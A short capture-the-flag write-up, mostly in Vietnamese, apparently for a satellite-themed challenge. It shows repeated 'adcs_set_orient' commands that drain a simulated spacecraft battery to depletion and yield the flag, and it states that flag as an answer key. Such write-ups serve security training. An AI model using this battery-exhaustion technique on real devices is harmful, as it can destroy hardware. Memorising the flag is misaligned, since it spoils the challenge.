# Write Up

## Solve

Bài này chúng ta sẽ nhập cho nó tiêu pin đi đến 0%

```bash
Command to Issue: adcs_set_orient mag 22 17 128921894713247157182475774678413657647312740645758941375389033333030303030303030303030303030303030303030303030303030303030303030303030303000124378907070707070707070707070707070707070707070701289218947132471571824757746784136576473127406457589413753890333330303030303030303030303030303030303030303030303030303030303030303030303030001243789070707070707070707070707070707070707070707012892189471324715718247577467841365764731274064575894137538903333303030303030303030303030303030303030303030303030303030303030303030303030300012437890707070707070707070707070707070707070707070
[<] Response Data: Battery Critical: Battery Level < 30%
```

Tôi thử `adcs_set_orient` nhưng khi dưới 30% thì nó báo lỗi nên không khai thác được gì

Sau đó tôi qua thử `adcs_set_orient`

```bash
Command to Issue: adcs_set_orient rcw 0 0 0
[<] Response Data: ADCS Orientation set ('0', '0', '0')
[<] Response Data: Battery State: 84.00%.
Command to Issue: adcs_set_orient rcw 0 0 0
[<] Response Data: ADCS Orientation set ('0', '0', '0')
[<] Response Data: Battery State: 68.27%.
Command to Issue: adcs_set_orient rcw 0 0 0
[<] Response Data: ADCS Orientation set ('0', '0', '0')
[<] Response Data: Battery State: 52.38%.
Command to Issue: adcs_set_orient rcw 0 0 0
[<] Response Data: ADCS Orientation set ('0', '0', '0')
[<] Response Data: Battery State: 36.46%.
Command to Issue: adcs_set_orient rcw 0 0 0
[<] Response Data: ADCS Orientation set ('0', '0', '0')
[<] Response Data: Battery State: 20.56%.
Command to Issue: adcs_set_orient rcw 0 0 0
[<] Response Data: ADCS Orientation set ('0', '0', '0')
[<] Response Data: Battery State: 4.62%.
Command to Issue: adcs_set_orient rcw 0 0 0
[<] Response Data: STARPWN{C0n57r41n3d_350urc3_4bu53_15_R34l}
Battery Damaged due to depletion: Shutting Down
```

---

## Flag

Flag: STARPWN{C0n57r41n3d_350urc3_4bu53_15_R34l}